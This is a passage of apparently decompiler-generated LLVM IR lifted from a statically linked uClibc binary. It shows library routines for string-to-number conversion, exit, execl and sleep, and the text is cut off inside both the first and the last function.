  %v0_8054d1612 = phi i32 [ %v0_8054cdd, %dec_label_pc_8054ccb ], [ %v0_8054d1613, %dec_label_pc_8054cee ]
  %v0_8054d08 = phi i32 [ %arg3, %dec_label_pc_8054ccb ], [ %v5_8054cf6, %dec_label_pc_8054cee ]
  %v1_8054cf9 = add i32 %v0_8054d08, -2
  store i32 %v1_8054cf9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8054d01 = icmp ugt i32 %v1_8054cf9, 34
  br i1 %v6_8054d01, label %dec_label_pc_8054d65, label %dec_label_pc_8054d03

dec_label_pc_8054d03:                             ; preds = %dec_label_pc_8054cf9
  %div = udiv i32 -1, %v0_8054d08
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8054d08
  %v1_8054d0a = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8054d43 = urem i32 %arg4, 256
  br label %dec_label_pc_8054d16

dec_label_pc_8054d14:                             ; preds = %dec_label_pc_8054d5b, %dec_label_pc_8054d43
  %v2_8054d18.pre = phi i32 [ %v0_8054d5e, %dec_label_pc_8054d5b ], [ %v2_8054d18.pre.pre, %dec_label_pc_8054d43 ]
  %v4_8054d16.pre = phi i32 [ %v1_8054d2f, %dec_label_pc_8054d5b ], [ %v4_8054d16.pre.pre, %dec_label_pc_8054d43 ]
  %v0_8054d14 = phi i32 [ %v1_8054d36, %dec_label_pc_8054d5b ], [ %v0_8054d14.pre, %dec_label_pc_8054d43 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8054d5b ], [ %v6_8054d47, %dec_label_pc_8054d43 ]
  br label %dec_label_pc_8054d16

dec_label_pc_8054d16:                             ; preds = %dec_label_pc_8054d03, %dec_label_pc_8054d14
  %v0_8054d7021 = phi i32 [ %v0_8054d7023, %dec_label_pc_8054d03 ], [ %v0_8054d14, %dec_label_pc_8054d14 ]
  %v0_8054d36 = phi i32 [ %v0_8054d1612, %dec_label_pc_8054d03 ], [ %v0_8054d14, %dec_label_pc_8054d14 ]
  %v2_8054d18 = phi i32 [ %v4_8054c93, %dec_label_pc_8054d03 ], [ %v2_8054d18.pre, %dec_label_pc_8054d14 ]
  %v4_8054d16 = phi i32 [ %div, %dec_label_pc_8054d03 ], [ %v4_8054d16.pre, %dec_label_pc_8054d14 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8054d03 ], [ %stack_var_-18.1, %dec_label_pc_8054d14 ]
  %v1_8054d16 = inttoptr i32 %v0_8054d36 to i8*
  %v2_8054d16 = load i8, i8* %v1_8054d16, align 1
  %v3_8054d16 = zext i8 %v2_8054d16 to i32
  %v5_8054d16 = and i32 %v4_8054d16, -256
  %v6_8054d16 = or i32 %v3_8054d16, %v5_8054d16
  store i32 %v6_8054d16, i32* %eax.global-to-local, align 4
  %v2_8054d1a = add i8 %v2_8054d16, -48
  %v12_8054d1a = zext i8 %v2_8054d1a to i32
  %v14_8054d1a = and i32 %v2_8054d18, -256
  %v15_8054d1a = or i32 %v12_8054d1a, %v14_8054d1a
  store i32 %v15_8054d1a, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8054d1a, 10
  br i1 %tmp, label %dec_label_pc_8054d2f, label %dec_label_pc_8054d22

dec_label_pc_8054d22:                             ; preds = %dec_label_pc_8054d16
  %v2_8054d22 = or i8 %v2_8054d16, 32
  %v7_8054d22 = zext i8 %v2_8054d22 to i32
  %v10_8054d22 = or i32 %v7_8054d22, %v5_8054d16
  store i32 %v10_8054d22, i32* %eax.global-to-local, align 4
  %v2_8054d24 = or i32 %v14_8054d1a, 40
  store i32 %v2_8054d24, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_8054d22, 97
  br i1 %tmp55, label %dec_label_pc_8054d2f, label %dec_label_pc_8054d2a

dec_label_pc_8054d2a:                             ; preds = %dec_label_pc_8054d22
  %v2_8054d2c = add i8 %v2_8054d22, -87
  %v15_8054d2c = zext i8 %v2_8054d2c to i32
  %v18_8054d2c = or i32 %v15_8054d2c, %v14_8054d1a
  store i32 %v18_8054d2c, i32* @ecx, align 4
  br label %dec_label_pc_8054d2f

dec_label_pc_8054d2f:                             ; preds = %dec_label_pc_8054d22, %dec_label_pc_8054d16, %dec_label_pc_8054d2a
  %v0_8054d5e = phi i32 [ %v2_8054d24, %dec_label_pc_8054d22 ], [ %v15_8054d1a, %dec_label_pc_8054d16 ], [ %v18_8054d2c, %dec_label_pc_8054d2a ]
  %v1_8054d2f = urem i32 %v0_8054d5e, 256
  store i32 %v1_8054d2f, i32* %eax.global-to-local, align 4
  %v1_8054d32 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054d32 = sub i32 %v1_8054d2f, %v1_8054d32
  %v10_8054d32 = and i32 %v2_8054d32, %v1_8054d32
  %v11_8054d32 = icmp slt i32 %v10_8054d32, 0
  %v13_8054d32 = icmp slt i32 %v2_8054d32, 0
  %v2_8054d34 = icmp eq i1 %v13_8054d32, %v11_8054d32
  br i1 %v2_8054d34, label %dec_label_pc_8054d65, label %dec_label_pc_8054d36

dec_label_pc_8054d36:                             ; preds = %dec_label_pc_8054d2f
  %v1_8054d36 = add i32 %v0_8054d36, 1
  store i32 %v1_8054d36, i32* %ebx.global-to-local, align 4
  %v0_8054d37 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054d37 = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_8054d37, %v1_8054d37
  br i1 %tmp56, label %dec_label_pc_8054d43, label %dec_label_pc_8054d3b

dec_label_pc_8054d3b:                             ; preds = %dec_label_pc_8054d36
  %v12_8054d37 = icmp eq i32 %v0_8054d37, %v1_8054d37
  %v1_8054d3b = icmp eq i1 %v12_8054d37, false
  br i1 %v1_8054d3b, label %dec_label_pc_8054d5b, label %dec_label_pc_8054d3d

dec_label_pc_8054d3d:                             ; preds = %dec_label_pc_8054d3b
  %v1_8054d3d = trunc i32 %v0_8054d5e to i8
  %tmp57 = icmp ugt i8 %v1_8054d3d, %v1_8054d0a
  br i1 %tmp57, label %dec_label_pc_8054d43, label %dec_label_pc_8054d5b

dec_label_pc_8054d43:                             ; preds = %dec_label_pc_8054d3d, %dec_label_pc_8054d36
  store i32 %v4_8054d43, i32* %eax.global-to-local, align 4
  %v6_8054d47 = and i8 %stack_var_-18.2, %tmp37
  %v1_8054d4b = sext i8 %v6_8054d47 to i32
  %v2_8054d4b = call i32 @__errno_location(i32 %v1_8054d4b)
  store i32 %v2_8054d4b, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8054d53 = inttoptr i32 %v2_8054d4b to i32*
  store i32 34, i32* %v1_8054d53, align 4
  %v0_8054d14.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8054d16.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8054d18.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8054d14

dec_label_pc_8054d5b:                             ; preds = %dec_label_pc_8054d3d, %dec_label_pc_8054d3b
  %v4_8054d5b = mul i32 %v0_8054d37, %v1_8054d32
  store i32 %v1_8054d2f, i32* %eax.global-to-local, align 4
  %v2_8054d61 = add i32 %v4_8054d5b, %v1_8054d2f
  store i32 %v2_8054d61, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054d14

dec_label_pc_8054d65:                             ; preds = %dec_label_pc_8054d2f, %dec_label_pc_8054cf9
  %v0_8054d70 = phi i32 [ %v0_8054d7023, %dec_label_pc_8054cf9 ], [ %v0_8054d7021, %dec_label_pc_8054d2f ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8054cf9 ], [ %stack_var_-18.2, %dec_label_pc_8054d2f ]
  %v4_8054d65 = icmp eq i32 %arg2, 0
  br i1 %v4_8054d65, label %dec_label_pc_8054d72, label %dec_label_pc_8054d6c

dec_label_pc_8054d6c:                             ; preds = %dec_label_pc_8054d65
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8054d70 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8054d70, i32* %v2_8054d70, align 4
  br label %dec_label_pc_8054d72

dec_label_pc_8054d72:                             ; preds = %dec_label_pc_8054d65, %dec_label_pc_8054d6c
  %v8_8054d72 = icmp eq i8 %stack_var_-18.3, 0
  %v2_8054d77 = zext i1 %v8_8054d72 to i32
  %v13_8054d77 = icmp eq i1 %v8_8054d72, false
  %v1_8054d793 = or i32 %v2_8054d77, -2147483648
  store i32 %v1_8054d793, i32* %ebx.global-to-local, align 4
  %v5_8054d7f = icmp eq i8 %tmp37, 0
  br i1 %v5_8054d7f, label %dec_label_pc_8054d97, label %dec_label_pc_8054d86

dec_label_pc_8054d86:                             ; preds = %dec_label_pc_8054d72
  %v0_8054d86 = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_8054d86, %v1_8054d793
  br i1 %tmp58, label %dec_label_pc_8054d8a, label %dec_label_pc_8054d97

dec_label_pc_8054d8a:                             ; preds = %dec_label_pc_8054d86
  %v1_8054d8a = sext i8 %stack_var_-18.3 to i32
  %v2_8054d8a = call i32 @__errno_location(i32 %v1_8054d8a)
  store i32 %v2_8054d8a, i32* %eax.global-to-local, align 4
  %v0_8054d8f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054d8f, i32* %edx.global-to-local, align 4
  %v1_8054d91 = inttoptr i32 %v2_8054d8a to i32*
  store i32 34, i32* %v1_8054d91, align 4
  br label %dec_label_pc_8054d97

dec_label_pc_8054d97:                             ; preds = %dec_label_pc_8054d86, %dec_label_pc_8054d72, %dec_label_pc_8054d8a
  %v0_8054d97 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054d99 = sub i32 0, %v0_8054d97
  %v4_8054da0 = select i1 %v13_8054d77, i32 %v1_8054d99, i32 %v0_8054d97
  store i32 %v4_8054da0, i32* @edx, align 4
  %v2_8054da6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054da6, i32* @ebx, align 4
  store i32 %v4_8054da0, i32* %eax.global-to-local, align 4
  ret i32 %v4_8054da0

; uselistorder directives
  uselistorder i32 %v4_8054da0, { 1, 0, 2 }
  uselistorder i1 %v8_8054d72, { 1, 0 }
  uselistorder i8 %v6_8054d47, { 1, 0 }
  uselistorder i32 %v1_8054d37, { 1, 0 }
  uselistorder i32 %v0_8054d37, { 2, 1, 0 }
  uselistorder i32 %v1_8054d36, { 1, 0 }
  uselistorder i32 %v2_8054d32, { 1, 0 }
  uselistorder i32 %v1_8054d2f, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8054d5e, { 2, 0, 1 }
  uselistorder i8 %v2_8054d22, { 1, 0, 2 }
  uselistorder i32 %v14_8054d1a, { 0, 2, 1 }
  uselistorder i32 %v0_8054d14, { 1, 0 }
  uselistorder i32 %v0_8054d08, { 1, 0, 2 }
  uselistorder i32 %v3_8054cf6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8054ceb, { 1, 0 }
  uselistorder i32 %v1_8054cde, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8054cdd, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_8054ca6.lcssa, { 1, 0 }
  uselistorder i32 %v0_8054ca5.lcssa, { 1, 0 }
  uselistorder i32 %v1_8054ca5, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8054c9b, { 1, 0, 2 }
  uselistorder i32 %v4_8054c93, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054d97, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054d72, { 1, 0 }
  uselistorder label %dec_label_pc_8054d2f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054d16, { 1, 0 }
  uselistorder label %dec_label_pc_8054cf9, { 1, 0 }
  uselistorder label %dec_label_pc_8054cee, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054ccb, { 1, 0 }
  uselistorder label %dec_label_pc_8054cca, { 1, 0 }
  uselistorder label %dec_label_pc_8054ca5, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8054dc3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054dc3, i32* @ebx, align 4
  %v2_8054dc8 = call i32 @__pthread_return_void(i32 %v2_8054dc3, i32 134566343)
  %v1_8054dd4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c4c0.534 to i32))
  %v0_8054dd9 = load i32, i32* @global_var_8062764.535, align 4
  store i32 %v0_8054dd9, i32* @eax, align 4
  %v1_8054de1 = icmp eq i32 %v0_8054dd9, 0
  br i1 %v1_8054de1, label %dec_label_pc_8054dee, label %dec_label_pc_8054de5

dec_label_pc_8054de5:                             ; preds = %entry
  %v0_8054de8 = load i32, i32* @esi, align 4
  %v1_8054de9 = call i32 @unknown_0(i32 %v0_8054de8)
  store i32 %v1_8054de9, i32* @eax, align 4
  br label %dec_label_pc_8054dee

dec_label_pc_8054dee:                             ; preds = %entry, %dec_label_pc_8054de5
  %v2_8054df3 = call i32 @__pthread_return_void(i32 %v2_8054dc3, i32 1)
  %v0_8054df8 = call i32 @__GI___uClibc_fini()
  %v0_8054e09 = call i32 @_stdio_term()
  %v0_8054e11 = load i32, i32* @esi, align 4
  %v1_8054e12 = call i32 @__GI__exit(i32 %v0_8054e11)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 5, 0, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 4, 2 }
  uselistorder label %dec_label_pc_8054dee, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8054e1e = load i32, i32* @ebx, align 4
  store i32 %v0_8054e1e, i32* %stack_var_-12, align 4
  %v2_8054e1f = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8054e1f, i32* %eax.global-to-local, align 4
  %v12_8054e22 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8054e28

dec_label_pc_8054e28:                             ; preds = %dec_label_pc_8054e28, %entry
  %v0_8054e2b = phi i32 [ 0, %entry ], [ %v1_8054e2b, %dec_label_pc_8054e28 ]
  %stack_var_-16.0 = phi i32 [ %v2_8054e1f, %entry ], [ %v1_8054e2c, %dec_label_pc_8054e28 ]
  %v1_8054e2b = add i32 %v0_8054e2b, 1
  store i32 %v1_8054e2b, i32* %esi.global-to-local, align 4
  %v1_8054e2c = add i32 %stack_var_-16.0, 4
  store i32 %v1_8054e2c, i32* %eax.global-to-local, align 4
  %v1_8054e32 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8054e32 = load i32, i32* %v1_8054e32, align 4
  %v3_8054e32 = icmp eq i32 %v2_8054e32, 0
  %v1_8054e35 = icmp eq i1 %v3_8054e32, false
  br i1 %v1_8054e35, label %dec_label_pc_8054e28, label %dec_label_pc_8054e37

dec_label_pc_8054e37:                             ; preds = %dec_label_pc_8054e28
  %v1_8054e37 = mul i32 %v1_8054e2b, 4
  %v2_8054e37 = add i32 %v1_8054e37, 34
  %v1_8054e3e = and i32 %v2_8054e37, -16
  %v2_8054e41 = sub i32 %v12_8054e22, %v1_8054e3e
  %v1_8054e46 = add i32 %v2_8054e41, 15
  %v1_8054e4a = and i32 %v1_8054e46, -16
  store i32 %v1_8054e4a, i32* @ebx, align 4
  store i32 %v1_8054e4a, i32* %ecx.global-to-local, align 4
  %v2_8054e4f = inttoptr i32 %v1_8054e4a to i32*
  store i32 %arg2, i32* %v2_8054e4f, align 16
  store i32 %v2_8054e1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054e57

dec_label_pc_8054e57:                             ; preds = %dec_label_pc_8054e57, %dec_label_pc_8054e37
  %stack_var_-16.1 = phi i32 [ %v2_8054e1f, %dec_label_pc_8054e37 ], [ %v1_8054e5e, %dec_label_pc_8054e57 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8054e5a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054e5a = add i32 %v0_8054e5a, 4
  store i32 %v1_8054e5a, i32* %ecx.global-to-local, align 4
  %v0_8054e5d = load i32, i32* %esi.global-to-local, align 4
  %v1_8054e5d = add i32 %v0_8054e5d, -1
  %v8_8054e5d = icmp eq i32 %v1_8054e5d, 0
  store i32 %v1_8054e5d, i32* %esi.global-to-local, align 4
  %v1_8054e5e = add i32 %stack_var_-16.1, 4
  %v1_8054e64 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8054e64 = load i32, i32* %v1_8054e64, align 4
  store i32 %v2_8054e64, i32* %eax.global-to-local, align 4
  %v2_8054e66 = inttoptr i32 %v1_8054e5a to i32*
  store i32 %v2_8054e64, i32* %v2_8054e66, align 4
  %v1_8054e68 = icmp eq i1 %v8_8054e5d, false
  br i1 %v1_8054e68, label %dec_label_pc_8054e57, label %dec_label_pc_8054e6a

dec_label_pc_8054e6a:                             ; preds = %dec_label_pc_8054e57
  %v0_8054e6a = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e6a = load i32, i32* @esp, align 4
  %v2_8054e6a = add i32 %v1_8054e6a, -4
  %v3_8054e6a = inttoptr i32 %v2_8054e6a to i32*
  store i32 %v0_8054e6a, i32* %v3_8054e6a, align 4
  %v0_8054e6b = load i32, i32* @global_var_806276c.536, align 4
  %v2_8054e6b = add i32 %v1_8054e6a, -8
  %v3_8054e6b = inttoptr i32 %v2_8054e6b to i32*
  store i32 %v0_8054e6b, i32* %v3_8054e6b, align 4
  %v0_8054e71 = load i32, i32* @ebx, align 4
  %v2_8054e71 = add i32 %v1_8054e6a, -12
  %v3_8054e71 = inttoptr i32 %v2_8054e71 to i32*
  store i32 %v0_8054e71, i32* %v3_8054e71, align 4
  %v5_8054e72 = add i32 %v1_8054e6a, -16
  %v6_8054e72 = inttoptr i32 %v5_8054e72 to i32*
  store i32 %arg1, i32* %v6_8054e72, align 4
  %v1_8054e75 = inttoptr i32 %v1_8054e5e to i8*
  %v2_8054e75 = call i32 @__GI_execve(i8* %v1_8054e75)
  store i32 %v2_8054e75, i32* %eax.global-to-local, align 4
  %v2_8054e7d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e7d, i32* @ebx, align 4
  ret i32 %v2_8054e75

; uselistorder directives
  uselistorder i32 %v1_8054e5d, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8054e2c, { 1, 0 }
  uselistorder i32 %v1_8054e2b, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8054e1f, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8054e8a = load i32, i32* @edi, align 4
  %v0_8054e8b = load i32, i32* @esi, align 4
  %v0_8054e8c = load i32, i32* @ebx, align 4
  %v15_8054e8d = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_8054e9a = icmp eq i32 %arg1, 0
  %v1_8054e9c = icmp eq i1 %v1_8054e9a, false
  br i1 %v1_8054e9c, label %dec_label_pc_8054eae.preheader, label %dec_label_pc_8054ffb

dec_label_pc_8054eae.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054ea3

dec_label_pc_8054ea3:                             ; preds = %dec_label_pc_8054ea3.dec_label_pc_8054ea3_crit_edge, %dec_label_pc_8054eae.preheader
  %v0_8054ea3 = phi i32 [ %v15_8054e8d, %dec_label_pc_8054eae.preheader ], [ %v0_8054ea3.pre, %dec_label_pc_8054ea3.dec_label_pc_8054ea3_crit_edge ]
  %v1_8054eae27 = phi i32 [ 31, %dec_label_pc_8054eae.preheader ], [ %v1_8054eae, %dec_label_pc_8054ea3.dec_label_pc_8054ea3_crit_edge ]
  %v2_8054ea3 = mul i32 %v1_8054eae27, 4
  %v3_8054ea3 = add i32 %v2_8054ea3, 292
  %v4_8054ea3 = add i32 %v3_8054ea3, %v0_8054ea3
  %v5_8054ea3 = inttoptr i32 %v4_8054ea3 to i32*
  store i32 0, i32* %v5_8054ea3, align 4
  %v0_8054eae.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054eae = add i32 %v0_8054eae.pre, -1
  %v9_8054eae = icmp slt i32 %v1_8054eae, 0
  store i32 %v1_8054eae, i32* %eax.global-to-local, align 4
  %v1_8054eaf = icmp eq i1 %v9_8054eae, false
  br i1 %v1_8054eaf, label %dec_label_pc_8054ea3.dec_label_pc_8054ea3_crit_edge, label %dec_label_pc_8054eb1

dec_label_pc_8054ea3.dec_label_pc_8054ea3_crit_edge: ; preds = %dec_label_pc_8054ea3
  %v0_8054ea3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054ea3

dec_label_pc_8054eb1:                             ; preds = %dec_label_pc_8054ea3
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8054ec7 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8054ec7, i32* @ebx, align 4
  store i32 %v2_8054ec7, i32* %stack_var_-460, align 4
  %v4_8054ecf = call i32 @__sigaddset(i32 %v2_8054ec7, i32 17, i32 %v1_8054eae, i32 %v1_8054eae)
  store i32 %v4_8054ecf, i32* %eax.global-to-local, align 4
  %v2_8054ed7 = icmp slt i32 %v4_8054ecf, 0
  br i1 %v2_8054ed7, label %dec_label_pc_8054fff, label %dec_label_pc_8054edf

dec_label_pc_8054edf:                             ; preds = %dec_label_pc_8054eb1
  %v2_8054ee0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8054ee0, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8054eeb = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8054eeb = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8054eeb, i32 %v2_8054ee0)
  store i32 %v4_8054eeb, i32* %eax.global-to-local, align 4
  %v1_8054ef3 = icmp eq i32 %v4_8054eeb, 0
  %v1_8054ef5 = icmp eq i1 %v1_8054ef3, false
  br i1 %v1_8054ef5, label %dec_label_pc_8054fff, label %dec_label_pc_8054efb

dec_label_pc_8054efb:                             ; preds = %dec_label_pc_8054edf
  store i32 %v2_8054ee0, i32* %stack_var_-460, align 4
  %v4_8054f00 = call i32 @__sigismember(i32 %v2_8054ee0, i32 17, i32 %v4_8054eeb, i32 %v4_8054eeb)
  store i32 %v4_8054f00, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8054f0d = icmp eq i32 %v4_8054f00, 0
  br i1 %v1_8054f0d, label %dec_label_pc_8054f21.preheader, label %dec_label_pc_8054fc9

dec_label_pc_8054f21.preheader:                   ; preds = %dec_label_pc_8054efb
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054f16

dec_label_pc_8054f16:                             ; preds = %dec_label_pc_8054f16.dec_label_pc_8054f16_crit_edge, %dec_label_pc_8054f21.preheader
  %v0_8054f16 = phi i32 [ %v15_8054e8d, %dec_label_pc_8054f21.preheader ], [ %v0_8054f16.pre, %dec_label_pc_8054f16.dec_label_pc_8054f16_crit_edge ]
  %v1_8054f2126 = phi i32 [ 31, %dec_label_pc_8054f21.preheader ], [ %v1_8054f21, %dec_label_pc_8054f16.dec_label_pc_8054f16_crit_edge ]
  %v2_8054f16 = mul i32 %v1_8054f2126, 4
  %v3_8054f16 = add i32 %v2_8054f16, 292
  %v4_8054f16 = add i32 %v3_8054f16, %v0_8054f16
  %v5_8054f16 = inttoptr i32 %v4_8054f16 to i32*
  store i32 0, i32* %v5_8054f16, align 4
  %v0_8054f21.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8054f21 = add i32 %v0_8054f21.pre, -1
  %v9_8054f21 = icmp slt i32 %v1_8054f21, 0
  store i32 %v1_8054f21, i32* %edx.global-to-local, align 4
  %v1_8054f22 = icmp eq i1 %v9_8054f21, false
  br i1 %v1_8054f22, label %dec_label_pc_8054f16.dec_label_pc_8054f16_crit_edge, label %dec_label_pc_8054f24

dec_label_pc_8054f16.dec_label_pc_8054f16_crit_edge: ; preds = %dec_label_pc_8054f16
  %v0_8054f16.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054f16

dec_label_pc_8054f24:                             ; preds = %dec_label_pc_8054f16
  store i32 %v2_8054ec7, i32* %eax.global-to-local, align 4
  store i32 %v2_8054ec7, i32* %stack_var_-460, align 4
  %v4_8054f30 = call i32 @__sigaddset(i32 %v2_8054ec7, i32 17, i32 0, i32 0)
  store i32 %v4_8054f30, i32* %eax.global-to-local, align 4
  %v2_8054f38 = icmp slt i32 %v4_8054f30, 0
  br i1 %v2_8054f38, label %dec_label_pc_8054fff, label %dec_label_pc_8054f40

dec_label_pc_8054f40:                             ; preds = %dec_label_pc_8054f24
  %v2_8054f41 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8054f41, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8054f4a = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8054f41)
  store i32 %v4_8054f4a, i32* %eax.global-to-local, align 4
  %v2_8054f52 = icmp slt i32 %v4_8054f4a, 0
  %v1_8054f54 = icmp eq i1 %v2_8054f52, false
  br i1 %v1_8054f54, label %dec_label_pc_8054f7e, label %dec_label_pc_8054f56

dec_label_pc_8054f56:                             ; preds = %dec_label_pc_8054f40
  %v0_8054f56 = load i32, i32* %stack_var_-460, align 4
  %v1_8054f56 = call i32 @__errno_location(i32 %v0_8054f56)
  store i32 %v1_8054f56, i32* %eax.global-to-local, align 4
  %v1_8054f5b = inttoptr i32 %v1_8054f56 to i32*
  %v2_8054f5b = load i32, i32* %v1_8054f5b, align 4
  store i32 %v2_8054f5b, i32* @esi, align 4
  store i32 %v1_8054f56, i32* @ebx, align 4
  store i32 %v2_8054ee0, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054f6c = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054f6c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054f6c, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054f77 = load i32, i32* @esi, align 4
  %v1_8054f77 = load i32, i32* @ebx, align 4
  %v2_8054f77 = inttoptr i32 %v1_8054f77 to i32*
  store i32 %v0_8054f77, i32* %v2_8054f77, align 4
  %v0_805500c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055002

dec_label_pc_8054f7e:                             ; preds = %dec_label_pc_8054f40
  %v3_8054f7e = load i32, i32* %stack_var_-420, align 4
  %v12_8054f7e = icmp eq i32 %v3_8054f7e, 1
  %v2_8054f8a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054f8a, i32* @ebx, align 4
  %v1_8054f91 = icmp eq i1 %v12_8054f7e, false
  br i1 %v1_8054f91, label %dec_label_pc_8054fb8, label %dec_label_pc_8054f93

dec_label_pc_8054f93:                             ; preds = %dec_label_pc_8054f7e
  store i32 %v2_8054f8a, i32* %stack_var_-460, align 4
  %v2_8054f97 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8054f97 = call i32 @__libc_nanosleep(%timespec* %v2_8054f97, i32 %v2_8054f8a)
  store i32 %v3_8054f97, i32* %eax.global-to-local, align 4
  store i32 %v3_8054f97, i32* @edi, align 4
  %v1_8054f9e = call i32 @__errno_location(i32 %v2_8054f8a)
  store i32 %v1_8054f9e, i32* %eax.global-to-local, align 4
  %v1_8054fa6 = inttoptr i32 %v1_8054f9e to i32*
  %v2_8054fa6 = load i32, i32* %v1_8054fa6, align 4
  store i32 %v2_8054fa6, i32* @esi, align 4
  store i32 %v1_8054f9e, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054faf = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054faf = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054faf, i32 0)
